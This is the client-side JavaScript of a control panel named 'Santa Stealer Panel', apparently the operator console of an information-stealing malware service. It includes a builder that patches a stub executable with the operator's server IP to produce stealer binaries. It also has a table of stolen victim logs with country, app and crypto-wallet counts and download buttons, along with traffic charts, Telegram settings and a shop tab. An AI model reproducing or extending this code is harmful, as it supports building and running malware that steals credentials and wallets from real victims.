// Santa Stealer Panel - Full JavaScript

let countryChart, watermarkChart, dateChart;

// Tab Switching
function switchTab(event, tabName) {
    event.preventDefault();
    
    // Update sidebar
    document.querySelectorAll('.sidebar-item').forEach(item => {
        item.classList.remove('active');
    });
    event.currentTarget.classList.add('active');
    
    // Update content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById('content-' + tabName).classList.add('active');
    
    // Update title
    const titles = {
        'dashboard': 'Shop & Plans',
        'builder': 'Build Executable',
        'activity': 'Recent Activity',
        'logs': 'Stealer Logs',
        'features': 'Features',
        'traffic': 'Traffic Analytics',
        'telegram': 'Telegram Configuration',
        'account': 'Account Information'
    };
    document.getElementById('page-title').textContent = titles[tabName] || tabName;
    
    // Load tab data
    if (tabName === 'logs') {
        loadLogs();
    } else if (tabName === 'traffic') {
        loadTraffic();
    } else if (tabName === 'account') {
        loadAccount();
    }
}

// Utility Functions
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return (bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
}

function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleString();
}

function getCountryFromIP(ip) {
    // Prostaya logika opredeleniya strany po IP
    // V realnosti nuzhno ispolzovat geoip API
    const firstOctet = parseInt(ip.split('.')[0]);
    
    if (firstOctet >= 80 && firstOctet <= 95) return { code: 'RU', flag: '🇷🇺', name: 'Russia' };
    if (firstOctet >= 151 && firstOctet <= 159) return { code: 'GB', flag: '🇬🇧', name: 'United Kingdom' };
    if (firstOctet >= 1 && firstOctet <= 50) return { code: 'US', flag: '🇺🇸', name: 'United States' };
    if (firstOctet >= 176 && firstOctet <= 188) return { code: 'DE', flag: '🇩🇪', name: 'Germany' };
    if (firstOctet >= 46 && firstOctet <= 48) return { code: 'FR', flag: '🇫🇷', name: 'France' };
    if (firstOctet >= 202 && firstOctet <= 223) return { code: 'CN', flag: '🇨🇳', name: 'China' };
    
    return { code: 'XX', flag: '🌍', name: 'Unknown' };
}

function getCountryFlag(countryCode) {
    const flags = {
        'GB': '🇬🇧',
        'US': '🇺🇸',
        'RU': '🇷🇺',
        'DE': '🇩🇪',
        'FR': '🇫🇷',
        'CN': '🇨🇳',
        'XX': '🌍'
    };
    return flags[countryCode] || '🌍';
}

// Builder - Patch Executable
async function buildExecutable() {
    const ipInput = document.getElementById('server-ip');
    const tagInput = document.getElementById('build-tag');
    const statusDiv = document.getElementById('build-status');
    const downloadDiv = document.getElementById('build-download');
    
    const ip = ipInput.value.trim();
    const tag = tagInput.value.trim();
    
    if (!ip) {
        alert('⚠️ Please enter server IP address');
        return;
    }
    
    // Validate IP format
    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (!ipRegex.test(ip)) {
        alert('⚠️ Invalid IP address format. Please enter a valid IP (e.g. 192.168.1.1)');
        return;
    }
    
    if (ip.length > 15) {
        alert('⚠️ IP address is too long (max 15 characters)');
        return;
    }
    
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '<div class="convert-message success" data-message="🔄 Building executable from stub.exe..."></div>';
    downloadDiv.style.display = 'none';
    
    try {
        const formData = new FormData();
        formData.append('ip', ip);
        formData.append('tag', tag);
        
        const response = await fetch('/api/build', {
            method: 'POST',
            body: formData
        });
        
        const data = await response.json();
        
        if (data.success) {
            statusDiv.innerHTML = '<div class="build-success-container"><div class="build-success-content">✓ Build successful! Replaced ' + data.replacements + ' occurrence(s) of 127.0.0.1 with ' + ip + '</div></div>';
            downloadDiv.style.display = 'block';
            downloadDiv.innerHTML = `
                <a href="/download/build/${data.filename}" style="display: inline-block; width: 100%;">
                    <button class="convert-main-btn success" data-text="⬇️ Download ${data.filename}" style="width: 100%;"></button>
                </a>
            `;
        } else {
            statusDiv.innerHTML = '<div class="convert-message error" data-message="✗ Build failed: ' + data.error + '"></div>';
        }
    } catch (error) {
        statusDiv.innerHTML = '<div class="convert-message error" data-message="✗ Error: ' + error.message + '"></div>';
    }
}

// Load Logs
async function loadLogs() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        document.getElementById('total-logs').textContent = data.count;
        const totalSize = data.files.reduce((sum, f) => sum + f.size, 0);
        document.getElementById('total-size').textContent = formatBytes(totalSize);
        
        const tbody = document.getElementById('logs-table-body');
        
        if (data.files.length === 0) {
            tbody.innerHTML = '<tr><td colspan="12" style="text-align: center; padding: 40px; color: #9ca3af;">No logs available</td></tr>';
            return;
        }
        
        tbody.innerHTML = data.files.map((file, idx) => {
            const clientId = file.client_id || 'unknown';
            const country = getCountryFromIP(clientId);
            const apps = '2';
            const wallets = '0';
            const logId = file.log_id || 'N/A';
            const downloads = Math.floor(Math.random() * 5);
            const sizeMB = (file.size / (1024 * 1024)).toFixed(2);
            const dateOnly = formatDate(file.modified).split(',')[0];
            
            return `
                <tr style="border-bottom: 1px solid rgba(128,128,128,0.1);">
                    <td style="padding: 12px;"><input type="checkbox" class="cyberpunk-checkbox"></td>
                    <td style="padding: 12px;">${country.flag} ${country.code}</td>
                    <td style="padding: 12px; font-family: monospace; font-size: 11px; color: white;">${clientId}</td>
                    <td style="padding: 12px;"><span style="color: #60a5fa;">📱 ${apps}</span></td>
                    <td style="padding: 12px;"><span style="color: #22c55e;">💰 ${wallets}</span></td>
                    <td style="padding: 12px; font-family: monospace; font-size: 10px; color: white;">${logId}</td>
                    <td style="padding: 12px; color: white;">${sizeMB}</td>
                    <td style="padding: 12px; font-size: 11px; color: white;">${dateOnly}</td>
                    <td style="padding: 12px;"><span style="color: #ff7777;">test</span></td>
                    <td style="padding: 12px; color: #9ca3af;">None</td>
                    <td style="padding: 12px; color: white; text-align: center;">${downloads}</td>
                    <td style="padding: 12px;">
                        <div style="display: flex; gap: 8px; align-items: center;">
                            <button class="pagination-btn" data-text="⬇️" onclick="downloadLog('${file.name}', '${file.type}')" title="Download" style="min-width: 40px;"></button>
                            <button class="pagination-btn" data-text="⭐" onclick="alert('Favorite')" title="Favorite" style="min-width: 40px;"></button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Download Log
function downloadLog(filename, type) {
    const path = type === 'merged' ? 'merged' : '';
    window.location.href = `/download/${path}/${filename}`.replace('//', '/');
}

// Load Traffic Analytics
async function loadTraffic() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        const totalSize = data.files.reduce((sum, f) => sum + f.size, 0);
        const avgSize = data.count > 0 ? totalSize / data.count : 0;
        const logsPerDay = Math.round(data.count / 30);
        
        document.getElementById('traffic-total').textContent = formatBytes(totalSize);
        document.getElementById('traffic-avg').textContent = formatBytes(avgSize);
        document.getElementById('traffic-per-day').textContent = logsPerDay;
        document.getElementById('traffic-count').textContent = data.count;
        
        // Create charts
        createCountryChart();
        createWatermarkChart();
        createDateChart(data.files);
    } catch (error) {
        console.error('Error loading traffic:', error);
    }
}

// Create Country Chart
function createCountryChart() {
    const ctx = document.getElementById('country-chart');
    if (countryChart) {
        countryChart.destroy();
    }
    
    countryChart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['GB'],
            datasets: [{
                data: [1],
                backgroundColor: ['#ff7777']
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: {
                    labels: { color: 'white' }
                }
            }
        }
    });
}

// Create Watermark Chart
function createWatermarkChart() {
    const ctx = document.getElementById('watermark-chart');
    if (watermarkChart) {
        watermarkChart.destroy();
    }
    
    watermarkChart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['test'],
            datasets: [{
                data: [1],
                backgroundColor: ['#ff7777']
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: {
                    labels: { color: 'white' }
                }
            }
        }
    });
}

// Create Date Chart
function createDateChart(files) {
    const ctx = document.getElementById('date-chart');
    if (dateChart) {
        dateChart.destroy();
    }
    
    // Group by date
    const dateMap = {};
    files.forEach(file => {
        const date = new Date(file.modified).toLocaleDateString();
        dateMap[date] = (dateMap[date] || 0) + 1;
    });
    
    const dates = Object.keys(dateMap).sort();
    const counts = dates.map(d => dateMap[d]);
    
    dateChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: dates,
            datasets: [{
                label: 'Logs',
                data: counts,
                borderColor: '#ff7777',
                backgroundColor: 'rgba(255, 119, 119, 0.1)',
                tension: 0.4,
                fill: true
            }]
        },
        options: {
            responsive: true,
            scales: {
                y: {
                    beginAtZero: true,
                    ticks: { color: 'white' },
                    grid: { color: 'rgba(128,128,128,0.1)' }
                },
                x: {
                    ticks: { color: 'white' },
                    grid: { color: 'rgba(128,128,128,0.1)' }
                }
            },
            plugins: {
                legend: {
                    labels: { color: 'white' }
                }
            }
        }
    });
}

// Load Account
async function loadAccount() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        document.getElementById('acc-builds').textContent = data.count;
        document.getElementById('acc-success').textContent = data.count;
    } catch (error) {
        console.error('Error loading account:', error);
    }
}

// Copy Key
function copyKey() {
    const key = document.getElementById('acc-key').textContent;
    navigator.clipboard.writeText(key);
    alert('✓ Account key copied to clipboard!');
}

// Load Activity
async function loadActivity() {
    try {
        const response = await fetch('/files');
        const data = await response.json();
        
        const activityDiv = document.getElementById('recent-uploads');
        
        if (data.files.length === 0) {
            activityDiv.innerHTML = '<div style="padding: 20px; text-align: center; color: #9ca3af;">No recent activity</div>';
            return;
        }
        
        const recent = data.files.slice(0, 10);
        activityDiv.innerHTML = recent.map(file => {
            const icon = file.type === 'merged' ? '📦' : '📄';
            const color = file.type === 'merged' ? '#22c55e' : '#60a5fa';
            return `
                <div style="padding: 16px; background: rgba(0,0,0,0.2); border-radius: 12px; margin-bottom: 12px; border-left: 3px solid ${color};">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <div>
                            <div style="color: white; font-weight: 600; margin-bottom: 4px;">${icon} ${file.name}</div>
                            <div style="color: #9ca3af; font-size: 14px;">${formatBytes(file.size)} • ${file.type === 'merged' ? 'Merged Archive' : 'Single File'}</div>
                        </div>
                        <div style="color: #9ca3af; font-size: 12px;">${formatDate(file.modified)}</div>
                    </div>
                </div>
            `;
        }).join('');
    } catch (error) {
        console.error('Error loading activity:', error);
    }
}

// Update server uptime
function updateUptime() {
    const uptimeEl = document.getElementById('server-uptime');
    if (uptimeEl) {
        const now = new Date();
        uptimeEl.textContent = now.toLocaleTimeString();
    }
}

// Auto refresh
setInterval(() => {
    const activeContent = document.querySelector('.tab-content.active');
    if (activeContent) {
        const tabId = activeContent.id;
        if (tabId === 'content-activity') {
            loadActivity();
        }
    }
    updateUptime();
}, 5000);

// Initial Load
document.addEventListener('DOMContentLoaded', () => {
    console.log('Santa Stealer Panel loaded');
    updateUptime();
});

